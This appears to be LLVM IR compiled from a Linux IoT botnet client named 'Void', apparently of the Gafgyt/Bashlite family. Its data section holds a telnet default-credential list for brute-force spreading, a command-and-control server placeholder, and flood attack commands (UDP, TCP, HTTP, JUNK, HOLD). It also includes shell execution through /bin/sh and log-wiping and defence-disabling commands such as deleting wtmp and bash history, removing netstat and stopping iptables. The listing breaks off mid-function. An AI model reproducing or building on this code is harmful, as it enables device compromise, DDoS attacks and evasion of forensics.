; ModuleID = 'host/ir_O1/Void.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = local_unnamed_addr global i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), align 8
@.str = private unnamed_addr constant [14 x i8] c"PAYLOADZZZZ\0D\0A\00", align 1
@commServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"IP:23\00", align 1
@useragents = local_unnamed_addr global [23 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.24, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.3 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.4 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.5 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.6 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.7 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.8 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.9 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.10 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.11 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.12 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.13 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.15 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.16 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.17 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.18 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.19 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.21 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.22 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.23 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.24 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@mainCommSock = local_unnamed_addr global i32 0, align 4
@currentServer = local_unnamed_addr global i32 -1, align 4
@gotIP = local_unnamed_addr global i32 0, align 4
@numpids = local_unnamed_addr global i64 0, align 8
@macAddress = local_unnamed_addr global [6 x i8] zeroinitializer, align 1
@usernames = local_unnamed_addr global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.25 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.26 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.29 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.30 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = local_unnamed_addr global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.30, i32 0, i32 0)], align 16
@.str.31 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.33 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.35 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.37 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.38 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@scanPid = common local_unnamed_addr global i32 0, align 4
@Q = internal unnamed_addr global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal unnamed_addr global i32 4095, align 4
@c = internal unnamed_addr global i32 362436, align 4
@.str.112 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal unnamed_addr global i32* null, align 8
@.str.40 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.41 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.42 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal unnamed_addr constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.43 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.45 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.47 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"sername:\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.55 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.56 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"wget -s -U \22\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"\22 -q \00", align 1
@.str.59 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.60 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.61 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.63 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.66 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.68 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.71 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.72 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.74 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@.str.76 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.80 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.85 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.87 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.88 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.90 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.91 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.93 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.94 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.95 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.96 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.98 = private unnamed_addr constant [6 x i8] c"DONGS\00", align 1
@.str.99 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.100 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"sshd\00", align 1
@.str.102 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.103 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.106 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.107 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.108 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.110 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.111 = private unnamed_addr constant [2 x i8] c" \00", align 1
@ipState.1 = internal unnamed_addr global i8 0, align 1
@ipState.2 = internal unnamed_addr global i8 0, align 1
@ipState.3 = internal unnamed_addr global i8 0, align 1
@ipState.4 = internal unnamed_addr global i8 0, align 1

; Function Attrs: noinline norecurse nounwind uwtable
define void @init_rand(i32) local_unnamed_addr #0 {
  store i32 %0, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %2 = add i32 %0, -1640531527
  store i32 %2, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %3 = add i32 %0, 1013904242
  store i32 %3, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  br label %4

; <label>:4:                                      ; preds = %17, %1
  %indvars.iv = phi i64 [ 3, %1 ], [ %indvars.iv.next.1, %17 ]
  %5 = add nsw i64 %indvars.iv, -3
  %6 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %5
  %7 = load i32, i32* %6, align 4
  %8 = add nsw i64 %indvars.iv, -2
  %9 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = trunc i64 %indvars.iv to i32
  %12 = xor i32 %11, -1640531527
  %13 = xor i32 %12, %7
  %14 = xor i32 %13, %10
  %15 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv
  store i32 %14, i32* %15, align 4
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 4096
  br i1 %exitcond, label %16, label %17

; <label>:16:                                     ; preds = %4
  ret void

; <label>:17:                                     ; preds = %4
  %18 = add nsw i64 %indvars.iv, -2
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = add nsw i64 %indvars.iv, -1
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = trunc i64 %indvars.iv.next to i32
  %25 = xor i32 %24, -1640531527
  %26 = xor i32 %25, %20
  %27 = xor i32 %26, %23
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %indvars.iv.next
  store i32 %27, i32* %28, align 4
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  br label %4
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @rand_cmwc() local_unnamed_addr #0 {
  %1 = load i32, i32* @rand_cmwc.i, align 4
  %2 = add i32 %1, 1
  %3 = and i32 %2, 4095
  store i32 %3, i32* @rand_cmwc.i, align 4
  %4 = zext i32 %3 to i64
  %5 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %4
  %6 = load i32, i32* %5, align 4
  %7 = zext i32 %6 to i64
  %8 = mul nuw nsw i64 %7, 18782
  %9 = load i32, i32* @c, align 4
  %10 = zext i32 %9 to i64
  %11 = add nuw nsw i64 %8, %10
  %12 = lshr i64 %11, 32
  %13 = trunc i64 %12 to i32
  %14 = add nuw nsw i64 %12, %11
  %15 = trunc i64 %14 to i32
  %16 = icmp ult i32 %15, %13
  %17 = zext i1 %16 to i32
  %storemerge = add nuw nsw i32 %17, %13
  store i32 %storemerge, i32* @c, align 4
  %.neg7 = sext i1 %16 to i32
  %.0.neg = sub i32 -2, %15
  %18 = add i32 %.0.neg, %.neg7
  %19 = load i32, i32* @rand_cmwc.i, align 4
  %20 = zext i32 %19 to i64
  %21 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %20
  store i32 %18, i32* %21, align 4
  ret i32 %18
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #1 {
  %2 = tail call i64 @strlen(i8* %0) #15
  %3 = add i64 %2, 4294967295
  br label %4

; <label>:4:                                      ; preds = %4, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %4 ], [ 0, %1 ]
  %5 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %6 = load i8, i8* %5, align 1
  %7 = sext i8 %6 to i32
  %8 = tail call i32 @isspace(i32 %7) #15
  %9 = icmp eq i32 %8, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %9, label %.preheader, label %4

.preheader:                                       ; preds = %4
  %10 = trunc i64 %3 to i32
  %11 = trunc i64 %indvars.iv29 to i32
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %.critedge.preheader, label %.lr.ph22.preheader

.lr.ph22.preheader:                               ; preds = %.preheader
  %sext = shl i64 %3, 32
  %13 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %14 = ashr exact i64 %sext31, 32
  br label %.lr.ph22

.critedge.preheader.loopexit:                     ; preds = %.lr.ph22, %25
  %.0.lcssa.ph = phi i32 [ %24, %.lr.ph22 ], [ %26, %25 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %10, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %15 = icmp sgt i32 %11, %.0.lcssa
  br i1 %15, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %16 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %17 = ashr exact i64 %sext33, 32
  %18 = sext i32 %.0.lcssa to i64
  br label %.critedge

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %25
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %25 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %26, %25 ]
  %19 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %20 = load i8, i8* %19, align 1
  %21 = sext i8 %20 to i32
  %22 = tail call i32 @isspace(i32 %21) #15
  %23 = icmp eq i32 %22, 0
  %24 = trunc i64 %indvars.iv27 to i32
  br i1 %23, label %.critedge.preheader.loopexit, label %25

; <label>:25:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %26 = add nsw i32 %.021, -1
  %27 = icmp sgt i64 %indvars.iv27, %14
  br i1 %27, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %16, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %28 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %29 = load i8, i8* %28, align 1
  %30 = sub nsw i64 %indvars.iv, %17
  %31 = getelementptr inbounds i8, i8* %0, i64 %30
  store i8 %29, i8* %31, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %32 = icmp slt i64 %indvars.iv, %18
  br i1 %32, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %33 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %33, 32
  %34 = ashr exact i64 %sext34, 32
  %35 = getelementptr inbounds i8, i8* %0, i64 %34
  store i8 0, i8* %35, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #1 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #1 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %9 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %10 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %11 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %12 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
